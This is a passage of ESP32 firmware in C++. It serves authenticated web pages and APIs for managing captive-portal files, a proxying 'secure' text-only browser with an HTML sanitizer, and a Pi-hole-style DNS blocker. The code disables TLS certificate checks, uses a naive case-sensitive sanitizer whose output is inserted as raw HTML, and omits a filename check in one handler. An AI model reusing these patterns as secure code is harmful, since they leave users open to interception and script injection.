        server.send(404, "text/plain", "File not found");
        return;
    }

    server.streamFile(file, "text/html");
    file.close();
}

void handleApiPortalsSave() {
    if (!checkAuth()) return;
    logRequest(server);

    JsonDocument doc;
    if (deserializeJson(doc, server.arg("plain"))) {
        server.send(400, "text/plain", "Invalid JSON");
        return;
    }

    String filename = doc["filename"] | "";
    String content = doc["content"] | "";

    if (filename.length() == 0) {
        server.send(400, "text/plain", "Missing filename");
        return;
    }

    if (filename.indexOf("..") != -1 || filename.indexOf("/") != -1) {
        server.send(403, "text/plain", "Invalid filename");
        return;
    }

    String path = "/portals/" + filename;
    File file = SD.open(path, FILE_WRITE);
    if (!file) {
        server.send(500, "text/plain", "Cannot create file");
        return;
    }

    file.print(content);
    file.close();
    server.send(200, "text/plain", "Saved");
}

void handleApiPortalsDelete() {
    if (!checkAuth()) return;
    logRequest(server);

    JsonDocument doc;
    if (deserializeJson(doc, server.arg("plain"))) {
        server.send(400, "text/plain", "Invalid JSON");
        return;
    }

    String filename = doc["filename"] | "";
    if (filename.length() == 0 || filename.indexOf("..") != -1 || filename.indexOf("/") != -1) {
        server.send(400, "text/plain", "Invalid filename");
        return;
    }

    String path = "/portals/" + filename;
    if (SD.remove(path)) {
        server.send(200, "text/plain", "Deleted");
    } else {
        server.send(500, "text/plain", "Delete failed");
    }
}

void handleApiPortalsSetActive() {
    if (!checkAuth()) return;
    logRequest(server);

    JsonDocument doc;
    if (deserializeJson(doc, server.arg("plain"))) {
        server.send(400, "text/plain", "Invalid JSON");
        return;
    }

    String filename = doc["filename"] | "";
    if (filename.length() == 0) {
        server.send(400, "text/plain", "Missing filename");
        return;
    }

    sysConfig.activePortal = "/portals/" + filename;
    saveSystemConfig();
    server.send(200, "text/plain", "Active portal updated");
}

void handleApiSystemConfig() {
    if (!checkAuth()) return;
    logRequest(server);

    if (server.method() == HTTP_POST) {
        JsonDocument doc;
        if (deserializeJson(doc, server.arg("plain"))) {
            server.send(400, "text/plain", "Invalid JSON");
            return;
        }

        if (doc.containsKey("rndisEnabled")) sysConfig.rndisEnabled = doc["rndisEnabled"];
        if (doc.containsKey("adblockEnabled")) sysConfig.adblockEnabled = doc["adblockEnabled"];
        if (doc.containsKey("dnsServerEnabled")) sysConfig.dnsServerEnabled = doc["dnsServerEnabled"];
        if (doc.containsKey("activePortal")) sysConfig.activePortal = doc["activePortal"].as<String>();
        if (doc.containsKey("dnsUpstream")) sysConfig.dnsUpstream = doc["dnsUpstream"].as<String>();

        // Browser settings
        if (doc.containsKey("browserTimeout")) sysConfig.browserTimeout = doc["browserTimeout"];
        if (doc.containsKey("browserMaxSize")) sysConfig.browserMaxSize = doc["browserMaxSize"];
        if (doc.containsKey("browserStripImages")) sysConfig.browserStripImages = doc["browserStripImages"];
        if (doc.containsKey("browserStripForms")) sysConfig.browserStripForms = doc["browserStripForms"];
        if (doc.containsKey("browserUserAgent")) sysConfig.browserUserAgent = doc["browserUserAgent"].as<String>();

        saveSystemConfig();

        // Restart DNS server if setting changed
        if (doc.containsKey("dnsServerEnabled")) {
            if (sysConfig.dnsServerEnabled && !dnsServerRunning) {
                startDnsServer();
            } else if (!sysConfig.dnsServerEnabled && dnsServerRunning) {
                stopDnsServer();
            }
        }

        server.send(200, "text/plain", "Config saved");
    } else {
        JsonDocument doc;
        doc["rndisEnabled"] = sysConfig.rndisEnabled;
        doc["adblockEnabled"] = sysConfig.adblockEnabled;
        doc["dnsServerEnabled"] = sysConfig.dnsServerEnabled;
        doc["activePortal"] = sysConfig.activePortal;
        doc["dnsUpstream"] = sysConfig.dnsUpstream;
        doc["bloomFilterLoaded"] = bloomFilterLoaded;
        doc["dnsServerRunning"] = dnsServerRunning;
        doc["dnsBlockedCount"] = dnsBlockedCount;
        doc["dnsForwardedCount"] = dnsForwardedCount;

        // Browser settings
        doc["browserTimeout"] = sysConfig.browserTimeout;
        doc["browserMaxSize"] = sysConfig.browserMaxSize;
        doc["browserStripImages"] = sysConfig.browserStripImages;
        doc["browserStripForms"] = sysConfig.browserStripForms;
        doc["browserUserAgent"] = sysConfig.browserUserAgent;

        String jsonString;
        serializeJson(doc, jsonString);
        server.send(200, "application/json", jsonString);
    }
}

// ============================================================================
// Text-Only Secure Browser
// ============================================================================
void handleBrowser() {
    if (!checkAuth()) return;
    logRequest(server);

    String html = R"WEBUI(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Browser - ESP32</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
    <style>
        :root{--bg:#1a1a2e;--card:#16213e;--secondary:#0f3460;--accent:#e94560;--success:#00bf63;--danger:#ff6b6b;--text:#eaeaea;--dim:#a0a0a0;--border:#0f3460}
        *{box-sizing:border-box;margin:0;padding:0}
        html,body{height:100%;margin:0;padding:0;overflow:hidden}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text)}
        .page-wrapper{display:flex;flex-direction:column;height:100vh;padding:15px}
        header{flex-shrink:0;background:linear-gradient(135deg,var(--card),var(--secondary));padding:1rem;margin-bottom:15px;border-radius:12px;display:flex;align-items:center;gap:15px}
        header a{color:var(--text);text-decoration:none;font-size:1.5rem;transition:transform .2s}
        header a:hover{transform:scale(1.1)}
        header h1{font-size:1.3rem}
        .toolbar{display:flex;gap:10px;margin-bottom:15px;flex-wrap:wrap}
        .toolbar input{flex:1;min-width:200px;padding:12px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:1rem}
        .toolbar input:focus{outline:none;border-color:var(--accent)}
        .toolbar button{padding:12px 20px;border-radius:8px;border:none;cursor:pointer;font-weight:600;background:var(--secondary);color:var(--text);transition:all .2s}
        .toolbar button:hover{background:var(--accent)}
        .toolbar button.primary{background:var(--success)}
        .info-bar{display:flex;gap:15px;margin-bottom:15px;padding:10px 15px;background:var(--card);border-radius:8px;font-size:0.9rem;flex-wrap:wrap}
        .info-item{display:flex;align-items:center;gap:5px}
        .info-item .label{color:var(--dim)}
        .content-area{flex-grow:1;background:var(--card);border-radius:12px;overflow:hidden;display:flex;flex-direction:column}
        .content-header{padding:10px 15px;background:var(--secondary);font-weight:600;display:flex;justify-content:space-between;align-items:center}
        #pageContent{flex:1;overflow-y:auto;padding:20px;background:#fff;color:#333;font-family:Georgia,serif;line-height:1.8}
        #pageContent a{color:#0066cc;text-decoration:underline;cursor:pointer}
        #pageContent a:hover{color:var(--accent)}
        #pageContent h1,#pageContent h2,#pageContent h3{color:#222;margin:20px 0 10px 0}
        #pageContent p{margin:10px 0}
        #pageContent .img-placeholder{background:#eee;padding:10px;border:1px dashed #ccc;color:#666;text-align:center;margin:10px 0}
        .loading{text-align:center;padding:40px;color:var(--dim)}
        .error{background:#ffebee;color:#c62828;padding:20px;border-radius:8px;margin:20px}
        .toast{position:fixed;bottom:20px;right:20px;padding:15px 25px;border-radius:8px;color:#fff;font-weight:600;z-index:9999;animation:slideIn .3s}
        .toast.success{background:var(--success)}
        .toast.error{background:var(--danger)}
        .toast.info{background:var(--secondary)}
        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
        @media(max-width:768px){.toolbar{flex-direction:column}.toolbar input,.toolbar button{width:100%}}
    </style>
</head>
<body>
    <div class="page-wrapper">
        <header>
            <a href="/">← Back</a>
            <h1>🔒 Secure Text-Only Browser</h1>
        </header>

        <div class="toolbar">
            <input type="text" id="urlInput" placeholder="Enter URL (e.g., https://example.com)" onkeypress="if(event.key==='Enter')navigateTo()">
            <button class="primary" onclick="navigateTo()">🔍 Go</button>
            <button onclick="searchDDG()">🦆 DuckDuckGo</button>
            <button onclick="goBack()">← Back</button>
            <button onclick="goForward()">→ Forward</button>
            <button onclick="window.location='/browser/settings'">⚙️ Settings</button>
        </div>

        <div class="info-bar">
            <div class="info-item"><span class="label">Mode:</span> <span>Text-Only (Scripts/Styles Stripped)</span></div>
            <div class="info-item"><span class="label">Status:</span> <span id="statusText">Ready</span></div>
        </div>

        <div class="content-area">
            <div class="content-header">
                <span id="pageTitle">Page Content</span>
                <span id="loadTime"></span>
            </div>
            <div id="pageContent">
                <div style="text-align:center;padding:40px;color:#666">
                    <h2>Welcome to Secure Browser</h2>
                    <p>Enter a URL above to browse the web safely.</p>
                    <p>All JavaScript, CSS, and images are stripped for security.</p>
                    <p>Links are rewritten to stay within this secure tunnel.</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        let history = [];
        let historyIndex = -1;

        function showToast(message, type = 'success') {
            const toast = document.createElement('div');
            toast.className = 'toast ' + type;
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 3000);
        }

        function navigateTo(url) {
            url = url || document.getElementById('urlInput').value.trim();
            if (!url) {
                showToast('Please enter a URL', 'error');
                return;
            }

            if (!url.startsWith('http://') && !url.startsWith('https://')) {
                url = 'https://' + url;
            }

            document.getElementById('urlInput').value = url;
            document.getElementById('statusText').textContent = 'Loading...';
            document.getElementById('pageContent').innerHTML = '<div class="loading">Fetching and sanitizing content...</div>';

            const startTime = Date.now();

            fetch('/proxy/fetch?url=' + encodeURIComponent(url))
                .then(r => {
                    if (!r.ok) throw new Error('Fetch failed: ' + r.status);
                    return r.text();
                })
                .then(html => {
                    const loadTime = Date.now() - startTime;
                    document.getElementById('loadTime').textContent = loadTime + 'ms';
                    document.getElementById('statusText').textContent = 'Loaded';
                    document.getElementById('pageContent').innerHTML = html;

                    // Extract title
                    const titleMatch = html.match(/<title[^>]*>([^<]*)<\/title>/i);
                    document.getElementById('pageTitle').textContent = titleMatch ? titleMatch[1] : url;

                    // Add to history
                    if (historyIndex < history.length - 1) {
                        history = history.slice(0, historyIndex + 1);
                    }
                    history.push(url);
                    historyIndex = history.length - 1;

                    // Handle internal link clicks
                    document.querySelectorAll('#pageContent a').forEach(a => {
                        a.addEventListener('click', function(e) {
                            e.preventDefault();
                            const href = this.getAttribute('data-href') || this.getAttribute('href');
                            if (href && href.startsWith('/proxy/fetch?url=')) {
                                navigateTo(decodeURIComponent(href.replace('/proxy/fetch?url=', '')));
                            } else if (href && !href.startsWith('javascript:')) {
                                navigateTo(href);
                            }
                        });
                    });
                })
                .catch(e => {
                    document.getElementById('statusText').textContent = 'Error';
                    document.getElementById('pageContent').innerHTML = '<div class="error"><h3>Failed to load page</h3><p>' + e.message + '</p></div>';
                    showToast('Failed to load: ' + e.message, 'error');
                });
        }

        function searchDDG() {
            const query = document.getElementById('urlInput').value.trim();
            if (!query) {
                navigateTo('https://lite.duckduckgo.com/lite/');
            } else {
                navigateTo('https://lite.duckduckgo.com/lite/?q=' + encodeURIComponent(query));
            }
        }

        function goBack() {
            if (historyIndex > 0) {
                historyIndex--;
                document.getElementById('urlInput').value = history[historyIndex];
                navigateTo(history[historyIndex]);
            }
        }

        function goForward() {
            if (historyIndex < history.length - 1) {
                historyIndex++;
                document.getElementById('urlInput').value = history[historyIndex];
                navigateTo(history[historyIndex]);
            }
        }
    </script>
</body>
</html>
)WEBUI";
    server.send(200, "text/html", html);
}

// ============================================================================
// HTML Sanitizer and Proxy Fetch
// ============================================================================
String sanitizeHtml(const String& html, const String& baseUrl) {
    String result = html;

    // Remove script tags and content
    int scriptStart = 0;
    while ((scriptStart = result.indexOf("<script", scriptStart)) != -1) {
        int scriptEnd = result.indexOf("</script>", scriptStart);
        if (scriptEnd != -1) {
            result = result.substring(0, scriptStart) + result.substring(scriptEnd + 9);
        } else {
            int tagEnd = result.indexOf(">", scriptStart);
            if (tagEnd != -1) {
                result = result.substring(0, scriptStart) + result.substring(tagEnd + 1);
            } else {
                break;
            }
        }
    }

    // Remove style tags and content
    int styleStart = 0;
    while ((styleStart = result.indexOf("<style", styleStart)) != -1) {
        int styleEnd = result.indexOf("</style>", styleStart);
        if (styleEnd != -1) {
            result = result.substring(0, styleStart) + result.substring(styleEnd + 8);
        } else {
            break;
        }
    }

    // Remove iframe tags
    int iframeStart = 0;
    while ((iframeStart = result.indexOf("<iframe", iframeStart)) != -1) {
        int iframeEnd = result.indexOf(">", iframeStart);
        if (result.indexOf("/>", iframeStart) < iframeEnd && result.indexOf("/>", iframeStart) != -1) {
            iframeEnd = result.indexOf("/>", iframeStart) + 2;
        } else if (iframeEnd != -1) {
            int closeTag = result.indexOf("</iframe>", iframeEnd);
            if (closeTag != -1) {
                iframeEnd = closeTag + 9;
            } else {
                iframeEnd += 1;
            }
        }
        if (iframeEnd != -1) {
            result = result.substring(0, iframeStart) + result.substring(iframeEnd);
        } else {
            break;
        }
    }

    // Remove object and embed tags
    int objStart = 0;
    while ((objStart = result.indexOf("<object", objStart)) != -1) {
        int objEnd = result.indexOf("</object>", objStart);
        if (objEnd != -1) {
            result = result.substring(0, objStart) + result.substring(objEnd + 9);
        } else {
            break;
        }
    }

    int embedStart = 0;
    while ((embedStart = result.indexOf("<embed", embedStart)) != -1) {
        int embedEnd = result.indexOf(">", embedStart);
        if (embedEnd != -1) {
            result = result.substring(0, embedStart) + result.substring(embedEnd + 1);
        } else {
            break;
        }
    }

    // Replace img tags with placeholder text
    int imgStart = 0;
    while ((imgStart = result.indexOf("<img", imgStart)) != -1) {
        int imgEnd = result.indexOf(">", imgStart);
        if (imgEnd != -1) {
            // Try to get alt text
            String imgTag = result.substring(imgStart, imgEnd + 1);
            String altText = "[IMAGE]";
            int altIdx = imgTag.indexOf("alt=\"");
            if (altIdx != -1) {
                int altEnd = imgTag.indexOf("\"", altIdx + 5);
                if (altEnd != -1) {
                    altText = "[IMAGE: " + imgTag.substring(altIdx + 5, altEnd) + "]";
                }
            }
            result = result.substring(0, imgStart) + "<span class=\"img-placeholder\">" + altText + "</span>" + result.substring(imgEnd + 1);
            imgStart += altText.length() + 40;
        } else {
            break;
        }
    }

    // Remove inline event handlers (onclick, onload, onerror, etc.)
    String events[] = {"onclick", "onload", "onerror", "onmouseover", "onmouseout", "onfocus", "onblur", "onsubmit", "onchange", "onkeydown", "onkeyup", "onkeypress"};
    for (int e = 0; e < 12; e++) {
        int evtStart = 0;
        while ((evtStart = result.indexOf(events[e] + "=\"", evtStart)) != -1) {
            int evtEnd = result.indexOf("\"", evtStart + events[e].length() + 2);
            if (evtEnd != -1) {
                result = result.substring(0, evtStart) + result.substring(evtEnd + 1);
            } else {
                evtStart++;
            }
        }
    }

    return result;
}

String rewriteLinks(const String& html, const String& baseUrl) {
    String result = html;

    // Parse base URL to get protocol and domain
    String protocol = "https://";
    String domain = baseUrl;

    if (domain.startsWith("http://")) {
        protocol = "http://";
        domain = domain.substring(7);
    } else if (domain.startsWith("https://")) {
        domain = domain.substring(8);
    }

    int pathStart = domain.indexOf('/');
    if (pathStart != -1) {
        domain = domain.substring(0, pathStart);
    }

    String baseOrigin = protocol + domain;

    // Rewrite href attributes
    int hrefStart = 0;
    while ((hrefStart = result.indexOf("href=\"", hrefStart)) != -1) {
        int hrefEnd = result.indexOf("\"", hrefStart + 6);
        if (hrefEnd != -1) {
            String href = result.substring(hrefStart + 6, hrefEnd);

            // Skip javascript: and # links
            if (href.startsWith("javascript:") || href.startsWith("#") || href.startsWith("mailto:")) {
                hrefStart = hrefEnd;
                continue;
            }

            String fullUrl = href;

            // Convert relative URLs to absolute
            if (href.startsWith("//")) {
                fullUrl = protocol.substring(0, protocol.length() - 2) + href;
            } else if (href.startsWith("/")) {
                fullUrl = baseOrigin + href;
            } else if (!href.startsWith("http://") && !href.startsWith("https://")) {
                // Relative path
                int lastSlash = baseUrl.lastIndexOf('/');
                if (lastSlash > 8) {
                    fullUrl = baseUrl.substring(0, lastSlash + 1) + href;
                } else {
                    fullUrl = baseUrl + "/" + href;
                }
            }

            // Rewrite to proxy URL
            String newHref = "/proxy/fetch?url=" + fullUrl;
            newHref.replace("\"", "%22");

            result = result.substring(0, hrefStart + 6) + newHref + "\" data-href=\"" + fullUrl + result.substring(hrefEnd);
            hrefStart += newHref.length() + 20;
        } else {
            break;
        }
    }

    return result;
}

void handleProxyFetch() {
    if (!checkAuth()) return;
    logRequest(server);

    if (!server.hasArg("url")) {
        server.send(400, "text/plain", "Missing url parameter");
        return;
    }

    String url = server.arg("url");

    // Basic URL validation
    if (!url.startsWith("http://") && !url.startsWith("https://")) {
        url = "https://" + url;
    }

    // Check blocklist if enabled
    if (sysConfig.adblockEnabled && bloomFilterLoaded) {
        String domain = url;
        if (domain.startsWith("https://")) domain = domain.substring(8);
        else if (domain.startsWith("http://")) domain = domain.substring(7);
        int pathIdx = domain.indexOf('/');
        if (pathIdx > 0) domain = domain.substring(0, pathIdx);

        if (checkBloomFilter(domain)) {
            server.send(403, "text/html", "<html><body style='font-family:Arial;text-align:center;padding:50px;'><h1>Blocked</h1><p>This domain is on the blocklist.</p><p>" + domain + "</p></body></html>");
            return;
        }
    }

    WiFiClientSecure client;
    client.setInsecure();
    client.setTimeout(sysConfig.browserTimeout);

    HTTPClient http;
    http.begin(client, url);
    http.addHeader("User-Agent", sysConfig.browserUserAgent);
    http.addHeader("Accept", "text/html,application/xhtml+xml");
    http.addHeader("Accept-Language", "en-US,en;q=0.9");
    http.setTimeout(sysConfig.browserTimeout);
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);

    int httpCode = http.GET();

    if (httpCode > 0) {
        if (httpCode == HTTP_CODE_OK || httpCode == HTTP_CODE_MOVED_PERMANENTLY || httpCode == HTTP_CODE_FOUND) {
            String payload = http.getString();

            // Limit response size based on settings
            if (payload.length() > (unsigned int)sysConfig.browserMaxSize) {
                payload = payload.substring(0, sysConfig.browserMaxSize) + "\n\n<p style='color:orange;'>[Content truncated - page too large (" + String(payload.length()) + " bytes)]</p>";
            }

            // Sanitize and rewrite links
            payload = sanitizeHtml(payload, url);
            payload = rewriteLinks(payload, url);

            server.send(200, "text/html", payload);
        } else {
            server.send(httpCode, "text/plain", "HTTP Error: " + String(httpCode));
        }
    } else {
        server.send(500, "text/plain", "Connection failed: " + http.errorToString(httpCode));
    }

    http.end();
}

// ============================================================================
// Browser Settings Page
// ============================================================================
void handleBrowserSettings() {
    if (!checkAuth()) return;
    logRequest(server);

    if (server.method() == HTTP_POST) {
        JsonDocument doc;
        if (deserializeJson(doc, server.arg("plain"))) {
            server.send(400, "text/plain", "Invalid JSON");
            return;
        }

        if (doc.containsKey("browserTimeout")) sysConfig.browserTimeout = doc["browserTimeout"];
        if (doc.containsKey("browserMaxSize")) sysConfig.browserMaxSize = doc["browserMaxSize"];
        if (doc.containsKey("browserStripImages")) sysConfig.browserStripImages = doc["browserStripImages"];
        if (doc.containsKey("browserStripForms")) sysConfig.browserStripForms = doc["browserStripForms"];
        if (doc.containsKey("browserUserAgent")) sysConfig.browserUserAgent = doc["browserUserAgent"].as<String>();

        saveSystemConfig();
        server.send(200, "text/plain", "Settings saved");
        return;
    }

    // GET - return settings page
    String html = R"WEBUI(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Browser Settings - ESP32</title>
    <style>
        :root{--bg:#1a1a2e;--card:#16213e;--secondary:#0f3460;--accent:#e94560;--success:#00bf63;--text:#eaeaea;--dim:#a0a0a0;--border:#0f3460}
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text);padding:20px}
        .container{max-width:600px;margin:auto}
        header{background:linear-gradient(135deg,var(--card),var(--secondary));padding:1rem;margin-bottom:20px;border-radius:12px;display:flex;align-items:center;gap:15px}
        header a{color:var(--text);text-decoration:none;font-size:1.5rem}
        header h1{font-size:1.3rem}
        .card{background:var(--card);border-radius:12px;padding:25px;box-shadow:0 4px 20px rgba(0,0,0,.3)}
        .form-group{margin-bottom:20px}
        label{display:block;margin-bottom:8px;font-weight:600;color:var(--dim)}
        input[type="text"],input[type="number"]{width:100%;padding:12px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:1rem}
        input:focus{outline:none;border-color:var(--accent)}
        .checkbox-group{display:flex;align-items:center;gap:10px}
        .checkbox-group input{width:20px;height:20px}
        button{width:100%;padding:14px;border-radius:8px;border:none;background:var(--success);color:#fff;font-weight:600;font-size:1rem;cursor:pointer;margin-top:10px}
        button:hover{opacity:0.9}
        .toast{position:fixed;bottom:20px;right:20px;padding:15px 25px;border-radius:8px;color:#fff;font-weight:600;z-index:9999}
        .toast.success{background:var(--success)}
        .toast.error{background:#ff6b6b}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <a href="/browser">← Back</a>
            <h1>Browser Settings</h1>
        </header>
        <div class="card">
            <div class="form-group">
                <label>Request Timeout (ms)</label>
                <input type="number" id="browserTimeout" min="1000" max="30000" step="1000">
            </div>
            <div class="form-group">
                <label>Max Response Size (bytes)</label>
                <input type="number" id="browserMaxSize" min="10000" max="200000" step="10000">
            </div>
            <div class="form-group">
                <label>User Agent</label>
                <input type="text" id="browserUserAgent">
            </div>
            <div class="form-group checkbox-group">
                <input type="checkbox" id="browserStripImages">
                <label for="browserStripImages" style="margin:0">Strip Images (replace with placeholders)</label>
            </div>
            <div class="form-group checkbox-group">
                <input type="checkbox" id="browserStripForms">
                <label for="browserStripForms" style="margin:0">Strip Forms (remove form elements)</label>
            </div>
            <button onclick="saveSettings()">Save Settings</button>
        </div>
    </div>
    <script>
        function showToast(msg, type) {
            const t = document.createElement('div');
            t.className = 'toast ' + type;
            t.textContent = msg;
            document.body.appendChild(t);
            setTimeout(() => t.remove(), 3000);
        }

        function loadSettings() {
            fetch('/api/system/config')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('browserTimeout').value = data.browserTimeout;
                    document.getElementById('browserMaxSize').value = data.browserMaxSize;
                    document.getElementById('browserUserAgent').value = data.browserUserAgent;
                    document.getElementById('browserStripImages').checked = data.browserStripImages;
                    document.getElementById('browserStripForms').checked = data.browserStripForms;
                });
        }

        function saveSettings() {
            const data = {
                browserTimeout: parseInt(document.getElementById('browserTimeout').value),
                browserMaxSize: parseInt(document.getElementById('browserMaxSize').value),
                browserUserAgent: document.getElementById('browserUserAgent').value,
                browserStripImages: document.getElementById('browserStripImages').checked,
                browserStripForms: document.getElementById('browserStripForms').checked
            };
            fetch('/browser/settings', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(r => r.ok ? showToast('Settings saved!', 'success') : showToast('Save failed', 'error'))
            .catch(e => showToast('Error: ' + e, 'error'));
        }

        window.onload = loadSettings;
    </script>
</body>
</html>
)WEBUI";
    server.send(200, "text/html", html);
}

// ============================================================================
// DNS Server Implementation (Pi-Hole Style)
// ============================================================================
void startDnsServer() {
    if (dnsServerRunning) return;

    if (dnsUdp.begin(DNS_PORT)) {
        dnsServerRunning = true;
        Serial.println("DNS Server started on port 53");
    } else {
        Serial.println("Failed to start DNS server");
    }
}

void stopDnsServer() {
    if (!dnsServerRunning) return;

    dnsUdp.stop();
    dnsServerRunning = false;
    Serial.println("DNS Server stopped");
}

String extractDomainFromDns(uint8_t* buffer, int len) {
    if (len < 12) return "";

    String domain = "";
    int pos = 12; // Skip DNS header

    while (pos < len && buffer[pos] != 0) {
        int labelLen = buffer[pos];
        if (labelLen > 63 || pos + labelLen >= len) break;

        if (domain.length() > 0) domain += ".";
        for (int i = 1; i <= labelLen && pos + i < len; i++) {
            domain += (char)buffer[pos + i];
        }
        pos += labelLen + 1;
    }

    return domain;
}

void sendDnsResponse(IPAddress &clientIP, uint16_t clientPort, uint8_t* buffer, int len, bool blocked) {
    if (len < 12) return;

    // Build response
    uint8_t response[512];
    memcpy(response, buffer, len);

    // Set response flags
    response[2] = 0x81; // QR=1, Opcode=0, AA=0, TC=0, RD=1
    response[3] = blocked ? 0x83 : 0x80; // RA=1, RCODE=3 (NXDOMAIN) if blocked, else 0

    if (blocked) {
        // NXDOMAIN - no answers
        response[6] = 0; response[7] = 0; // ANCOUNT = 0
    }

    dnsUdp.beginPacket(clientIP, clientPort);
    dnsUdp.write(response, len);
    dnsUdp.endPacket();
}

void handleDnsRequest() {
    int packetSize = dnsUdp.parsePacket();
    if (packetSize == 0) return;

    uint8_t buffer[512];
    int len = dnsUdp.read(buffer, sizeof(buffer));
    if (len < 12) return;

    IPAddress clientIP = dnsUdp.remoteIP();
    uint16_t clientPort = dnsUdp.remotePort();

    String domain = extractDomainFromDns(buffer, len);
    domain.toLowerCase();

    if (domain.length() == 0) return;

    // Check blocklist
    bool blocked = false;
    if (sysConfig.adblockEnabled && bloomFilterLoaded) {
        blocked = checkBloomFilter(domain);
    }

    if (blocked) {
        dnsBlockedCount++;
        Serial.print("DNS BLOCKED: ");
        Serial.println(domain);
        sendDnsResponse(clientIP, clientPort, buffer, len, true);
    } else {
        dnsForwardedCount++;

        // Forward to upstream DNS
        WiFiUDP forwardUdp;
        IPAddress upstreamIP;

        if (WiFi.hostByName(sysConfig.dnsUpstream.c_str(), upstreamIP)) {
            forwardUdp.begin(0);
            forwardUdp.beginPacket(upstreamIP, 53);
            forwardUdp.write(buffer, len);
            forwardUdp.endPacket();

            // Wait for response
            unsigned long start = millis();
            while (millis() - start < 2000) {
                int respSize = forwardUdp.parsePacket();
                if (respSize > 0) {
                    uint8_t respBuffer[512];
                    int respLen = forwardUdp.read(respBuffer, sizeof(respBuffer));

                    dnsUdp.beginPacket(clientIP, clientPort);
                    dnsUdp.write(respBuffer, respLen);
                    dnsUdp.endPacket();
                    break;
                }
                delay(10);
            }
            forwardUdp.stop();
        }
    }
}

void handleApiDnsStats() {
    if (!checkAuth()) return;
    logRequest(server);

    JsonDocument doc;
    doc["dnsServerEnabled"] = sysConfig.dnsServerEnabled;
    doc["dnsServerRunning"] = dnsServerRunning;
    doc["blockedCount"] = dnsBlockedCount;
    doc["forwardedCount"] = dnsForwardedCount;
    doc["bloomFilterLoaded"] = bloomFilterLoaded;
    doc["upstreamDns"] = sysConfig.dnsUpstream;

    String jsonString;
    serializeJson(doc, jsonString);
    server.send(200, "application/json", jsonString);
}

// ============================================================================
// Blocklist Editor
// ============================================================================
void handleBlocklistEditor() {
    if (!checkAuth()) return;
    logRequest(server);

    String html = R"WEBUI(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blocklist Editor - ESP32</title>
    <style>
        :root{--bg:#1a1a2e;--card:#16213e;--secondary:#0f3460;--accent:#e94560;--success:#00bf63;--danger:#ff6b6b;--text:#eaeaea;--dim:#a0a0a0;--border:#0f3460}
        *{box-sizing:border-box;margin:0;padding:0}
        html,body{height:100%;margin:0;padding:0;overflow:hidden}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text)}
        .page-wrapper{display:flex;flex-direction:column;height:100vh;padding:15px}
        header{flex-shrink:0;background:linear-gradient(135deg,var(--card),var(--secondary));padding:1rem;margin-bottom:15px;border-radius:12px;display:flex;align-items:center;gap:15px}
        header a{color:var(--text);text-decoration:none;font-size:1.5rem}
        header h1{font-size:1.3rem}
        .stats-bar{display:flex;gap:15px;margin-bottom:15px;flex-wrap:wrap}
        .stat-card{background:var(--card);padding:15px 20px;border-radius:8px;flex:1;min-width:150px}
        .stat-label{color:var(--dim);font-size:0.8rem}
        .stat-value{font-size:1.5rem;font-weight:bold}
        .stat-value.blocked{color:var(--danger)}
        .stat-value.forwarded{color:var(--success)}
        .content-container{display:flex;gap:15px;flex-grow:1;min-height:0}
        .sidebar{flex:0 0 250px;background:var(--card);padding:15px;border-radius:12px;overflow-y:auto;display:flex;flex-direction:column}
        .sidebar h3{color:var(--accent);margin-bottom:15px;font-size:1rem;border-bottom:2px solid var(--accent);padding-bottom:10px}
        .file-list{flex-grow:1;overflow-y:auto}
        .file-item{display:flex;align-items:center;padding:10px;margin-bottom:5px;background:var(--bg);border-radius:8px;cursor:pointer;transition:all .2s}
        .file-item:hover{background:var(--secondary)}
        .file-item.selected{border:2px solid var(--accent)}
        .main-content{flex-grow:1;display:flex;flex-direction:column;min-width:0}
        .toolbar{display:flex;gap:10px;margin-bottom:10px;flex-wrap:wrap}
        .toolbar input{flex:1;min-width:150px;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)}
        .toolbar button{padding:10px 15px;border-radius:8px;border:none;cursor:pointer;font-weight:600;background:var(--secondary);color:var(--text);transition:all .2s}
        .toolbar button:hover{background:var(--accent)}
        .toolbar button.success{background:var(--success)}
        .toolbar button.danger{background:var(--danger)}
        #editor{flex:1;width:100%;padding:15px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-family:'Fira Code',monospace;font-size:13px;resize:none;line-height:1.4}
        .help-text{padding:10px;background:var(--secondary);border-radius:8px;margin-top:10px;font-size:0.85rem;color:var(--dim)}
        .toast{position:fixed;bottom:20px;right:20px;padding:15px 25px;border-radius:8px;color:#fff;font-weight:600;z-index:9999}
        .toast.success{background:var(--success)}
        .toast.error{background:var(--danger)}
        @media(max-width:768px){.content-container{flex-direction:column}.sidebar{flex:0 0 auto;max-height:150px}}
    </style>
</head>
<body>
    <div class="page-wrapper">
        <header>
            <a href="/">← Back</a>
            <h1>Blocklist Editor (Pi-Hole Style DNS)</h1>
        </header>

        <div class="stats-bar">
            <div class="stat-card">
                <div class="stat-label">Blocked Requests</div>
                <div class="stat-value blocked" id="blockedCount">0</div>
            </div>
            <div class="stat-card">
